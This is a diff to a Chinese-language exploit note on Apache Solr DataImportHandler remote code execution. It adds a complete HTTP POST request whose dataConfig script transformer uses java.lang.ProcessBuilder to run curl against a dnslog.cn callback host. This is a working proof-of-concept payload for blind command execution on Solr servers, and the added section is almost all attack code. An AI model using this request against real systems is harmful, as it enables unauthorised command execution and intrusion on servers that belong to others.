@@ -81,6 +81,7 @@ return row;
 ### # 无回显payload
 
 区别在于dataConfig：
+
 ```
 <dataConfig>
 <dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
@@ -119,6 +120,40 @@ return row;
 </dataConfig>
 
 ```
+
+### # POST
+
+```bash
+POST /solr/core1/dataimport HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 581
+
+command=full-import&verbose=false&clean=false&commit=false&debug=true&core=new_core&name=dataimport&dataConfig=<dataConfig>
+  <dataSource type="URLDataSource"/>
+  <script><![CDATA[
+          function poc(data){
+new+java.lang.ProcessBuilder["(java.lang.String[])"](["curl","fy544n.dnslog.cn"]).start()
+}
+  ]]></script>
+
+  <document>
+    <entity name="stackoverflow"
+            url="https://stackoverflow.com/feeds/tag/solr"
+            processor="XPathEntityProcessor"
+            forEach="/feed"
+            transformer="script:poc" />
+  </document>
+</dataConfig>
+```
+
+![](../../assets/solr-RCE-post-method.png)
+
 
 ### # 区别
 左边无回显，右边有回显
